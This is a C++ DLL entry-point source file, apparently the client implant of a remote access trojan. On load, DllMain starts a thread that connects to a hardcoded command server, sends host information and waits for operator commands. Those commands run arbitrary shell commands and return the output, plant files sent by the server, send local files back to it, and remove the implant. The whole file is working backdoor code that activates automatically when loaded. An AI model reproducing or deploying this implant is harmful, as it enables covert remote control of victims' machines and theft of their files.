// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "pch.h"
#include "MyClient.h"
#include "Command.h"
#include "Utility.h"
#include <iostream>

#define IP "127.0.0.1"
//#define IP "192.168.248.1"
#define PORT 65533
#define HEARTBEAT_TIME 10000
#define ReconnectionTime 1000
#define FILE_PATH_LEN 256

HANDLE hMutex = NULL;
HMODULE g_hDll = NULL;
HANDLE hSendHeartBeat = NULL;
HANDLE hRecvThread = NULL;


DWORD WINAPI SendHeartBeat(LPVOID lpThreadParameter) {
	MySocket* s = (MySocket*)lpThreadParameter;
	// 创建新类发送心跳
	MySocket* SendHB = s->New();
	while (true) {
		Sleep(HEARTBEAT_TIME);
		if (!SendHB->MySendHeartBeat()) {
			SendHB->FreeCopy();
			return 1;
		}
	}
	return 0;
}

DWORD WINAPI RecvPacket(LPVOID lpThreadParameter) {
	MySocket* s = (MySocket*)lpThreadParameter;

	while (!s->Connect(IP, PORT)) { // 连接失败则1秒后重新连接
		wprintf(L"Connect Error %d\n", WSAGetLastError());
		Sleep(ReconnectionTime);
	}
	// 向服务端发送连接成功
	//char buf[20] = "Connect Success";

	//send(s->GetSock(), buf, 20, 0);

	// 如果已经创建过心跳功能线程，则释放，重新创建
	if (hSendHeartBeat != NULL) {
		CloseHandle(hSendHeartBeat);
	}

	// 获取并发送该PC的信息
	PCMsg* msg = s->GetPCMsg();

	if (!s->SendMsg(msg)) {
		printf("SendMsg Error %d\n", WSAGetLastError());
		return 1;
	}

	//// 创建心跳线程
	//hSendHeartBeat = CreateThread(
	//	NULL, 0, (LPTHREAD_START_ROUTINE)SendHeartBeat, (LPVOID)s, 0, NULL
	//);

	//if (hSendHeartBeat == NULL) {
	//	wprintf(L"Create thread error %d\n", GetLastError());
	//	return 1;
	//}

	// 主线程：接收指令
	UINT32 command = 0;
	wchar_t* cmd = new wchar_t[CMDSIZE];
	wchar_t* sendbuf = new wchar_t[CMDSIZE];
	char* Bytebuf = new char[CMDSIZE];
	char* FileBuf = NULL;
	while (true) {
		if (!s->RecvIns(&command)) {
			wprintf(L"Recv Ins error %d\n", WSAGetLastError());
			return 1;
		}

		switch (command) {
		case HELP: {
			break;
		}
		case CMD: {
			memset(cmd, 0, CMDSIZE);
			wprintf(L"Wait For Recv Command\n");
			if (!s->RecvCommand(cmd, Bytebuf)) {
				wprintf(L"Recv Command Error %d\n", WSAGetLastError());
				break;
			}
			wprintf(L"%s\n", cmd);
			// 接收成功就开始执行
			PipeCmd(cmd, sendbuf, 1);
			// 发送sendbuf
			if (!s->SendResult(sendbuf, Bytebuf)) {
				wprintf(L"Send Cmd Res Error %d\n", WSAGetLastError());
				break;
			}
			break;
		}
		case UPLOAD: {
			UINT32 FileLen = 0;
			wchar_t* Path = new wchar_t[FILE_PATH_LEN];
			ZeroMemory(Path, FILE_PATH_LEN * sizeof(wchar_t));

			wprintf(L"Recv Server File Path\n");
			// 先接收文件路径

			if (!s->RecvCommand(Path, Bytebuf)) {
				wprintf(L"Recv Server File Path error %d\n", WSAGetLastError());
				break;
			}

			// 再new文件的空间
			FileBuf = new char[FILEBUFFERLEN * sizeof(char)];
			ZeroMemory(FileBuf, FILEBUFFERLEN * sizeof(char));

			wprintf(L"Recv Server File\n");
			// 接收文件
			if (!s->RecvFile(FileBuf, FILEBUFFERLEN)) {
				wprintf(L"Recv File error %d\n", WSAGetLastError());
				return false;
			}
			// 写入文件
			if (!s->WriteToFile(FileBuf, Path)) {
				wprintf(L"Recv File Error %d\n", WSAGetLastError());
				return false;
			}

			wprintf(L"Upload File Success\n");
			delete[] FileBuf;
			break;
		}
		case DOWNLOAD: {
			UINT32 FileLen = 0;
			wchar_t* Path = new wchar_t[FILE_PATH_LEN];
			ZeroMemory(Path, FILE_PATH_LEN * sizeof(wchar_t));

			// 先接收文件路径
			if (!s->RecvCommand(Path, Bytebuf)) {
				wprintf(L"Recv Server File Path error %d\n", WSAGetLastError());
				break;
			}

			wprintf(L"Recv Server File Path\n");
			// 打开文件并写入缓冲区
			int ret = s->ReadFromFile(Path, &FileLen, &FileBuf);
			// 发送ReadFromFile的返回值
			if (!s->SendCommand(ret)) {
				wprintf(L"Send Command Error %d\n", WSAGetLastError());
				return false;
			}

			if (ret == 1) {
				wprintf(L"Open File Error %d\n", GetLastError());
				break;
			}
			else if (ret == 2){
				wprintf(L"Read From File Error %d\n", GetLastError());
				break;
			}
			// 发送文件到server
			if (!s->SendFile(FileBuf, FileLen)) {
				wprintf(L"Send File Error %d\n", WSAGetLastError());
				return false;
			}
			wprintf(L"Send File To Server Success\n");
			break;
		}
		case SCREENSHOT: {
			break;
		}
		case SUICIDE: {
			s->Free();
			//WaitForSingleObject(hSendHeartBeat, INFINITE);
			CloseHandle(hSendHeartBeat);
			delete[] Bytebuf;
			delete[] sendbuf;
			delete[] cmd;
			goto exit;

		}
		}
	}

exit:
	//ExitThread(0);
	//FreeLibraryAndExitThread(g_hDll, 0);
	return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
) {
	switch (ul_reason_for_call) {
	case DLL_PROCESS_ATTACH: {
		hMutex = CreateMutex(NULL, NULL, NULL);
		g_hDll = hModule;
		MySocket* myClient = NULL;
		myClient = new MySocket;

		if (!myClient->SocketInit(hMutex)) {
			return false;
		}
		hRecvThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)RecvPacket, (LPVOID)myClient, 0, NULL);

		break;
	}
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		//delete myCilent;
		//CloseHandle(hMutex);
		//WaitForSingleObject(hRecvThread, INFINITE);
		//FreeLibraryAndExitThread(g_hDll, 0);
		break;
	}
	return TRUE;
}

